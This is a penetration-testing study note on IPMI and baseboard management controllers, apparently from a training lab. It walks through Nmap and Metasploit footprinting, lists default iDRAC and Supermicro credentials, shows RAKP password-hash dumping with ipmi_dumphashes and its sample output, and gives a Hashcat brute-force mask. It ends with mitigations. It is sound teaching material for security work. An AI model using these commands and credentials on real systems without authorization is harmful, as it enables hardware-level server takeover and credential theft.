# IPMI (Intelligent Platform Management Interface)

## Overview

The **Intelligent Platform Management Interface (IPMI)** is a standardized protocol used for hardware management and monitoring. It operates independently of the host operating system, BIOS, CPU, and firmware, allowing administrators to manage servers even when the operating system is unresponsive or the server is powered off.

IPMI is commonly used for:

- Modifying BIOS settings before the operating system boots.
- Managing systems while they are powered off.
- Accessing servers after a system failure.
- Monitoring hardware conditions, including temperature, voltage, fans, and power supplies.
- Reviewing hardware inventory and system event logs.
- Sending alerts through SNMP.

Although the host may be powered off, the IPMI management controller still requires power and a network connection.

IPMI was initially developed by Intel in 1998 and is supported by numerous hardware vendors, including Dell, HP, Cisco, Supermicro, and Intel.

IPMI 2.0 also supports **Serial over LAN**, allowing administrators to access serial console output remotely.

### Main Components

- **Baseboard Management Controller (BMC):** The microcontroller responsible for hardware management.
- **Intelligent Chassis Management Bus (ICMB):** Enables communication between chassis.
- **Intelligent Platform Management Bus (IPMB):** Provides communication between the BMC and other management components.
- **IPMI Memory:** Stores information such as system event logs and repository data.
- **Communication Interfaces:** Include local system, serial, LAN, ICMB, and PCI management interfaces.

---

## Service Footprinting

IPMI typically communicates over **UDP port 623**.

Systems implementing IPMI are managed through a Baseboard Management Controller (BMC), which is often embedded in the server motherboard.

Common BMC implementations include:

- HP iLO
- Dell DRAC / iDRAC
- Supermicro IPMI

Access to a BMC can provide extensive control over a server, including the ability to monitor, reboot, power off, or reinstall its operating system. Some BMCs also expose web management consoles and remote command-line services such as SSH or Telnet.

### Nmap

We can use Nmap's `ipmi-version` NSE script to identify IPMI services and determine their protocol version.

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

Example output:

```text
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
```

The output confirms that UDP port 623 is open and identifies the service as IPMI 2.0.

### Metasploit Version Scan

Metasploit provides the `auxiliary/scanner/ipmi/ipmi_version` module for identifying IPMI versions.

```text
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set RHOSTS 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

Example output:

```text
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
```

The module identifies the IPMI version and reports supported authentication methods.

---

## Default Credentials

During security assessments, BMCs are sometimes found with their default credentials unchanged.

Common examples include:

| Product | Username | Password |
|---|---|---|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | Randomized 8-character string containing numbers and uppercase letters |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

These are common examples and may vary depending on the hardware model, firmware version, and configuration.

During an authorized assessment, checking for default credentials can reveal improperly configured management interfaces.

---

## Dangerous Settings

### IPMI 2.0 RAKP Authentication Vulnerability

IPMI 2.0 has a known weakness involving the **Remote Authenticated Key-Exchange Protocol (RAKP)**.

During authentication, the BMC may send a salted SHA-1 or MD5 password hash to the client before authentication is completed.

An attacker with network access to the IPMI service may be able to retrieve a password hash for a valid BMC user and attempt to crack it offline using tools such as Hashcat.

The weakness is particularly dangerous when administrators use weak, predictable, or default passwords.

### Retrieving Hashes with Metasploit

Metasploit provides the following module:

`auxiliary/scanner/ipmi/ipmi_dumphashes`

Example usage:

```text
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

Important module options include:

| Option | Description |
|---|---|
| `RHOSTS` | Target host or hosts |
| `RPORT` | Target port, normally UDP 623 |
| `USER_FILE` | File containing usernames |
| `PASS_FILE` | File containing common passwords |
| `OUTPUT_HASHCAT_FILE` | Optional output file in Hashcat format |
| `OUTPUT_JOHN_FILE` | Optional output file in John the Ripper format |
| `CRACK_COMMON` | Attempts to crack common passwords automatically |

Example output:

```text
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
```

In this example, the tool retrieves a hash for the `ADMIN` account and identifies the password as `ADMIN`.

Only perform these tests against systems you own or are explicitly authorized to assess.

### Cracking Hashes with Hashcat

The original lab material identifies **Hashcat mode `7300`** for the IPMI hash format.

The following mask attack attempts all eight-character combinations consisting of uppercase letters and digits:

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Explanation:

- `-m 7300`: Selects the hash mode specified in the lab.
- `ipmi.txt`: Input file containing the captured hash.
- `-a 3`: Uses a brute-force mask attack.
- `?1?1?1?1?1?1?1?1`: Specifies eight character positions.
- `-1 ?d?u`: Defines the custom character set as digits and uppercase letters.

The search space can be substantial, and the time required depends on the available hardware and password complexity.

Testing different wordlists may also help identify weak passwords during an authorized assessment.

---

## Security Risks

Exposed or poorly configured IPMI services can create significant security risks:

- Unauthorized access to server management functions.
- Remote rebooting or powering off of systems.
- Potential operating system reinstallation.
- Exposure of password hashes to offline cracking.
- Credential reuse across other systems.
- Possible compromise of critical infrastructure if recovered credentials are reused.

Because BMC access can provide control comparable to physical access to a server, IPMI should be included in internal penetration-testing procedures.

---

## Mitigation

The RAKP behavior is part of the IPMI 2.0 specification, so there is no simple universal protocol-level fix.

Recommended mitigations include:

1. **Change default credentials:** Replace factory-default passwords with strong, unique passwords.
2. **Use strong passwords:** Choose long passwords that are resistant to offline cracking.
3. **Restrict network access:** Place BMC interfaces on a dedicated management network.
4. **Apply firewall rules:** Restrict UDP port 623 to trusted administrative hosts.
5. **Disable unnecessary services:** Turn off IPMI or other management interfaces when they are not required.
6. **Update firmware:** Apply vendor-provided firmware updates and security recommendations.
7. **Avoid credential reuse:** Never reuse BMC passwords on operating systems or other services.
8. **Monitor access:** Review management activity and hardware event logs.

Network segmentation is particularly important because an attacker who can reach the BMC may be able to interact with the hardware independently of the host operating system.

---

## Quick Reference

| Item | Details |
|---|---|
| Protocol | IPMI |
| Default port | UDP 623 |
| Main component | Baseboard Management Controller (BMC) |
| Common implementations | HP iLO, Dell iDRAC/DRAC, Supermicro IPMI |
| Nmap script | `ipmi-version` |
| Metasploit version module | `auxiliary/scanner/ipmi/ipmi_version` |
| Metasploit hash module | `auxiliary/scanner/ipmi/ipmi_dumphashes` |
| Hashcat mode cited in the lab | `7300` |

---

## References

- [IPMI Basics — Thomas-Krenn](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)
- [Nmap — ipmi-version NSE Script](https://nmap.org/nsedoc/scripts/ipmi-version.html)
- [Metasploit — IPMI Information Discovery](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/)
- [Metasploit — IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
- [IPMI RAKP Password Cracking Background](https://web.archive.org/web/20260421071724/http://fish2.com/ipmi/remote-pw-cracking.html)
